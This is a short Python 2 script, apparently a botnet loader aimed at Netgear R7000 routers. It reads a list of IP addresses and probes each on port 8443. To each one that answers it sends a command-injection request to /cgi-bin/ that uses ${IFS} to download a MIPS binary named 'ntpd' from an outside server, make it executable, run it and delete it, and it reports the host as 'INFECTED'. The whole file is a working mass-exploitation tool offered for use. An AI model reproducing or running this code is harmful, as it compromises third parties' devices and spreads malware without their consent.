#! python !#
#r7000 negear loader 

import threading, random, socket, time, sys, requests, re


if len(sys.argv) < 2:
	print "\033[37mUsage: python "+sys.argv[0]+" <list>\033[37m"
	sys.exit()

server_ip = "b4.ck.do.or"
port = 8443
# CONFIGURE URL LINE 33 MIPS BINARY DEFAULT: "ntpd"
class r7000(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		try:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(4)
				s.connect((self.ip, port))
				s.close()
				fail = 0
			except:
				fail = 1
				pass
			try:
				if fail:
					pass
				else:
					r = requests.get("http://"+self.ip+":8443/cgi-bin/;cd${IFS}/var/tmp;${IFS}wget${IFS}http://"+server_ip+"/ntpd;${IFS}chmod${IFS}777${IFS}ntpd;${IFS}./ntpd;${IFS}rm${IFS}-rf${IFS}ntpd", timeout=12)
					if r.status_code == 200 and "Not Found" not in r.text:
						print "INFECTED "+self.ip
					elif r.status_code == 404:
						sys.exit()
			except:
				pass
		except Exception as e:
			pass

ips = open(sys.argv[1], "r").readlines()
for ip in ips:
	try:
		t = r7000(ip)
		t.start()
		time.sleep(0.01)
	except Exception as e:
		pass